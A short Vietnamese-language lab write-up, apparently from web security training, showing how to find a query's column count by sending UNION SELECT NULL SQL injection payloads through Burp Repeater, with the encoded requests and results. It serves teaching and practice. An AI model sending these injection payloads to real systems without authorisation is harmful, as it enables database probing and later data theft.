# SQL Injection Lab 07: UNION Attack - Determine Number of Columns

## Mục tiêu
Xác định số cột của query bằng kỹ thuật `UNION SELECT ... NULL`.

<img src="images/07_union-column-count-2026-04-14-22-16-38.png" alt="Lab overview" width="760" />
<br><br>

## Các bước thực hiện
1. Bắt request `GET /filter?category=...` trong Burp Repeater.

2. Thử payload 1 cột:

```sql
' union select null --
```

Query trong Burp:

```http
GET /filter?category=%27%20union%20select%20null%20-- HTTP/2
```

Kết quả trả về `Internal Server Error` => số cột chưa khớp.

<img src="images/07_union-column-count-2026-04-14-22-20-12.png" alt="One-column union failed" width="760" />
<br><br>

3. Tăng dần số `NULL` cho đến khi không còn lỗi.

Payload thành công:

```sql
' union select null, null, null --
```

Query trong Burp:

```http
GET /filter?category=%27%20union%20select%20null%2C%20null%2C%20null%20-- HTTP/2
```

Response hiển thị bình thường => số cột của query là **3**.

<img src="images/07_union-column-count-2026-04-14-22-21-16.png" alt="Three-column union success" width="760" />
<br><br>

## Kết luận
Số cột được trả về bởi query là:

```text
3
```
